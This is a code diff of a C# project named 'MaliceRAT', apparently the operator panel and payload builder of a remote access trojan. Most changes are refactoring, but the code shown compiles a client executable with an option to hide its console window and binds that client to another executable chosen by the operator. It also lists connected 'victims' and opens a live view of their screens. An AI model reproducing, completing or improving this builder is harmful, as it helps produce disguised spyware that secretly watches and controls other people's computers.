@@ -24,7 +24,8 @@ namespace MaliceRAT
             server.InfoReceived += Server_InfoReceived;
             server.ClientDisconnected += Server_ClientDisconnected;
         }
-       private async Task<string> CompileClientExeAsync()
+
+        private async Task<string> CompileClientExeAsync()
         {
             string sourceCode;
 
@@ -56,20 +57,20 @@ namespace MaliceRAT
             CompilerParameters parameters = new CompilerParameters
             {
                 GenerateExecutable = true,
-                OutputAssembly = Path.Combine(Application.StartupPath, "client.exe"),
+                OutputAssembly = Path.Combine(Application.StartupPath, "client_temp.exe"),
                 CompilerOptions = gunaHideConsole.Checked ? "/optimize /target:winexe" : "/optimize",
                 ReferencedAssemblies = {
                     "System.dll",
                     "System.Core.dll",
                     "System.Net.Sockets.dll",
-                    "Newtonsoft.Json.dll",
                     "mscorlib.dll",
                     "System.Memory.dll",
                     "Microsoft.CSharp.dll",
                     "System.Runtime.dll",
                     "System.Runtime.CompilerServices.Unsafe.dll",
                     "System.Drawing.dll",
-                    "System.Windows.Forms.dll"
+                    "System.Windows.Forms.dll",
+                    "System.Web.Extensions.dll"
                 }
             };
 
@@ -87,8 +88,10 @@ namespace MaliceRAT
 
                 return null;
             }
+
             return parameters.OutputAssembly;
         }
+
         private byte[] CombineExeFiles(string exe1, string exe2)
         {
             byte[] exe1Bytes = File.ReadAllBytes(exe1);
@@ -100,28 +103,28 @@ namespace MaliceRAT
 
             return combinedBytes;
         }
+
         private async void buildButton_Click(object sender, EventArgs e)
         {
             string exePath = await CompileClientExeAsync();
 
             if (exePath != null)
             {
-                if (gunaCheckBox2.Checked && !string.IsNullOrEmpty(textBox1.Text))
+                if (gunaCombineFile.Checked && !string.IsNullOrEmpty(combinedFilePath.Text))
                 {
-                    byte[] combinedBytes = CombineExeFiles(exePath, textBox1.Text);
+                    byte[] combinedBytes = CombineExeFiles(exePath, combinedFilePath.Text);
                     File.WriteAllBytes(Path.Combine(Application.StartupPath, "CombinedClient.exe"), combinedBytes);
                 }
-                else
-                {
-                    File.Copy(exePath, Path.Combine(Application.StartupPath, "CombinedClient.exe"), true);
-                }
+
                 MessageBox.Show("Compilation successful: " + exePath);
+                
                 if (gunaOpenFolder.Checked)
                 {
                     System.Diagnostics.Process.Start("explorer.exe", Application.StartupPath);
                 }
             }
         }
+        
         private void gunaButton1_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog openFileDialog = new OpenFileDialog())
@@ -132,7 +135,7 @@ namespace MaliceRAT
                 if (openFileDialog.ShowDialog() == DialogResult.OK)
                 {
                     string selectedFilePath = openFileDialog.FileName;
-                    textBox1.Text = selectedFilePath;
+                    combinedFilePath.Text = selectedFilePath;
                 }
             }
         }
@@ -195,14 +198,14 @@ namespace MaliceRAT
             ContextMenuStrip victimContextMenu = new ContextMenuStrip();
 
             ToolStripMenuItem viewScreenItem = ContextMenuUtilities.CreateContextMenuItem("View Screen", ViewScreen_Click);
-            ToolStripMenuItem disconnectItem = ContextMenuUtilities.CreateContextMenuItem("Disconnect", (sender, e) => Disconnect_Click(sender, e, gunaVictimsTable));
+            ToolStripMenuItem disconnectItem = ContextMenuUtilities.CreateContextMenuItem("Disconnect", Disconnect_Click);
             
             victimContextMenu.Items.AddRange(new ToolStripItem[] { viewScreenItem, disconnectItem });
 
             gunaVictimsTable.ContextMenuStrip = victimContextMenu;
             gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaVictimsTable_MouseDown(sender, e, gunaVictimsTable);
         }
-        private int? GetSelectedId(DataGridView gunaVictimsTable)
+        private int? GetSelectedId()
         {
             if (gunaVictimsTable.SelectedRows.Count > 0)
             {
@@ -218,29 +221,23 @@ namespace MaliceRAT
             }
             return null;
         }
-        private void Disconnect_Click(object sender, EventArgs e, DataGridView gunaVictimsTable)
+
+        private void Disconnect_Click(object sender, EventArgs e)
         {
-            var id = GetSelectedId(gunaVictimsTable);
+            var id = GetSelectedId();
             if (id.HasValue)
             {
                 server.DisconnectClient(id.Value);
             }
         }
+
         private void ViewScreen_Click(object sender, EventArgs e)
         {
-            var id = GetSelectedId(gunaVictimsTable);
+            var id = GetSelectedId();
             if (id.HasValue)
             {
                 ScreenViewForm screenViewForm = new ScreenViewForm(id.Value, server);
                 screenViewForm.Show();
-            }
-        }
-        private void Disconnect_Click(object sender, EventArgs e)
-        {
-            var id = GetSelectedId(gunaVictimsTable);
-            if (id.HasValue)
-            {
-                server.DisconnectClient(id.Value);
             }
         }
     }
